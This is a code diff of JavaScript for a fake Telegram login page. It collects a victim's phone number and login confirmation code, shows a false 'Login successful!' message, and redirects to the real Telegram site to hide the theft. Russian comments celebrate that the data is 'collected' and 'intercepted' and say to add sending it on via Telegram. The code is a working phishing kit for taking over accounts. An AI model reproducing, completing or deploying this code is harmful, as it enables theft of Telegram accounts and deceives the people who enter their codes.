@@ -1,35 +1,42 @@
-// Глобальные переменные для хранения данных
 var userPhone = '';
 
-// Обработка номера телефона
-document.getElementById('phoneForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+function nextStep() {
+    var countryCode = document.querySelector('.tg_country_code').value;
+    var phoneNumber = document.querySelector('.tg_phone').value;
     
-    userPhone = document.getElementById('phone').value;
+    if (!phoneNumber) {
+        alert('Please enter your phone number');
+        return;
+    }
     
-    // Показываем раздел с кодом
-    document.getElementById('phoneForm').style.display = 'none';
-    document.getElementById('codeSection').style.display = 'block';
+    userPhone = countryCode + phoneNumber;
     
-    // Сохраняем номер (можно отправить в Telegram)
-    console.log("Phone number:", userPhone);
-});
+    // Показываем введенный номер
+    document.getElementById('phoneDisplay').textContent = userPhone;
+    
+    // Переключаем на шаг с кодом
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+    
+    console.log("Phone entered:", userPhone);
+}
 
-// Обработка кода подтверждения
-document.getElementById('codeForm').addEventListener('submit', function(e) {
-    e.preventDefault();
+function submitCode() {
+    var code = document.querySelector('.tg_code').value;
     
-    var code = document.getElementById('code').value;
+    if (!code) {
+        alert('Please enter the code');
+        return;
+    }
     
     // ВСЕ ДАННЫЕ СОБРАНЫ!
-    console.log("Phone:", userPhone);
-    console.log("Code:", code);
+    console.log("Full data - Phone:", userPhone, "Code:", code);
     
-    // Показываем alert с данными
-    alert("Данные перехвачены:\nТелефон: " + userPhone + "\nКод: " + code);
+    // Показываем данные (замени на отправку в Telegram)
+    alert("Login successful!\\nPhone: " + userPhone + "\\nCode: " + code);
     
     // Редирект на настоящий Telegram
     setTimeout(function() {
         window.location.href = "https://web.telegram.org/";
-    }, 2000);
-});
+    }, 1500);
+}
